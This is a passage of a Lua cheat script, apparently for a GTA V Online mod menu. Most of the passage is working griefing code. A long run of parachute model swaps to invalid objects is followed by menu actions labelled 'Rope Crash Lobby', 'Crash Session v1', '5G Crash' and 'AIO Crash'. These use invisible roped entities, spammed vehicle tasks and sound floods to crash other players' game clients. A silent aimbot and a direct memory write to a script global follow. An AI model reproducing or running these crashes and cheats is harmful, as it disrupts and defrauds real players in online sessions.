                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                ------------------------------------------------------------------------ Para 3
                object_hash3 = 452618762 -- Weed Plant  
                STREAMING.REQUEST_MODEL(object_hash3)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash3)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                ------------------------------------------------------------------------ Para 4
                object_hash4 = 322248450 -- Pooltable
                STREAMING.REQUEST_MODEL(object_hash4)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash4)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 0X185E2FF3 -- Outlaw Car
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("clearworld")
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 741586030 -- Pranger
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 11680152 -- Bucket
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 54873101 -- Generator
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 0x14C71C28 -- Plog Door
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 2566281822 -- Random Item
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3216060441 -- Random Item 2
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3249056020 -- Random Item 3
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3264692260 -- Seashark
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3287367628 -- Random Item 4
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3288565915 -- Random Item 5
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3308813655 -- Random Item 6
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3311433188 -- Random Item 7
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3308022675 -- Dominator3
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3319621991 -- Rogue
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3324988722 -- Random Item 8
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 899381934 -- Random Item 9
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 0x14C71C28 -- Plog Door
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 2132890591 -- idk
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 2727244247 -- idk
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                -----------------------------------------------------------------------
                object_hash6 = 3009487541 -- YatchWin
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 310817095 -- FragTest
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 3973074921 -- 1
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 930879665 -- 2
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 3981782132 -- 3
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 452618762 -- 4
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 3989890648 -- 5
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 756855196 -- 6
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 3961554325 -- 7
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                menu.trigger_commands("clearworld")
                -----------------------------------------------------------------------
                object_hash6 = 2281152298 -- FishSlice
                STREAMING.REQUEST_MODEL(object_hash6)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash6)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                util.yield(1000)
                GRAPHICS.ANIMPOSTFX_STOP_ALL()
    
                menu.trigger_commands("tpmazehelipad")
    
    local gwobaw = memory.script_global(2672505 + 1685 + 756)
    memory.write_int(gwobaw, memory.read_int(gwobaw) &~ (1 << 1)) 
    end)
    
    menu.action(online,"Rope Crash Lobby", {"RopeCrashLobby"} ,"Rejoin or Join A New Instance Once Satisfied" , function(player_id)
        local hash = 0X187D938D
        local pos = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hash, pos.x + 5, pos.y, pos.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hash, pos.x, pos.y, pos.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
        util.yield(10000)
        menu.trigger_commands("deleteropes")
    end)
    
    menu.action(online, "Crash Session v1", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    
    menu.action(online, "5G Crash For Session", {"5GCrashForSession"}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)
    
    menu.action(online, "AIO Crash For Session", {"AIOCrashForSession"}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
            end
            util.yield()
        end
    end)

--------------------------------------------------------------------------------------------------------------------------------
--Weapons

menu.divider(weapons, "Aimbot")

saimbot_mode = "closest"
local function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = players.get_position(players.user())
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if players.user_ped() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(players.user_ped(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(players.user_ped(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then 
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(v) then 
                    target_this = false 
                end
            end
            if not satarget_targetfriends and satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    local player_id = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(player_id)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false 
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end 
        end
    end
    return cur_tar
end
sa_showtarget = false
satarget_usefov = false
menu.toggle_loop(weapons, "Silent Aimbot", {"SilentAim"}, "Silent Aimbot", function(toggle)
    local target = get_aimbot_target()
    if target ~= 0 then
        --local t_pos = ENTITY.GET_ENTITY_COORDS(target, true)
        local t_pos = PED.GET_PED_BONE_COORDS(target, 31086, 0.01, 0, 0)
        local t_pos2 = PED.GET_PED_BONE_COORDS(target, 31086, -0.01, 0, 0.00)
        if sa_showtarget then
            GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z']+2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
        end
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local wep = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
            local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
            if satarget_damageo then
                dmg = sa_odmg
            end
            local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(t_pos['x'], t_pos['y'], t_pos['z'], t_pos2['x'], t_pos2['y'], t_pos2['z'], dmg, true, wep, players.user_ped(), true, false, 10000, veh)
        end
    end
end)

menu.toggle(weapons, "Players", {"SilentAim_Players"}, "", function(on)
    satarget_players = on
end)

menu.toggle(weapons, "NPCs", {"SilentAim_NPCs"}, "", function(on)
    satarget_npcs = on
end)

menu.toggle(weapons, "Use FOV", {"SAFOV On"}, "", function(on)
    satarget_usefov = on
end, false)

sa_fov = 60
menu.slider(weapons, "FOV", {"SilentAimFOV"}, "", 1, 270, 60, 1, function(s)
    sa_fov = s
end)

menu.toggle(weapons, "Ignore Vehicles", {"SilentAim_Vehicles"}, "", function(on)
    satarget_novehicles = on
end)

satarget_nogodmode = true
menu.toggle(weapons,  "Ignore GodMode Players", {"SA_IgnoreGods"}, "", function(on)
    satarget_nogodmode = on
end, true)

menu.toggle(weapons, "Target Friends", {"SA_TargetFriends"}, "", function(on)
    satarget_targetfriends = on
end)

menu.toggle(weapons, "Damage Override", {"SA_DamageOverride"}, "", function(on)
    satarget_damageo = on
end)

sa_odmg = 100
menu.slider(weapons, "Override Amount", {"SA_Dmg"}, "", 1, 1000, 100, 1, function(s)
    sa_odmg = s
end)

menu.toggle(weapons, "Display Target", {"SA_DisplayTarget"}, "", function(on)
    sa_showtarget = on
end, false)

if beacon then
    util.draw_ar_beacon(changed_pos) 
end

-------------------------------------
-- SHOOTING EFFECT
-------------------------------------

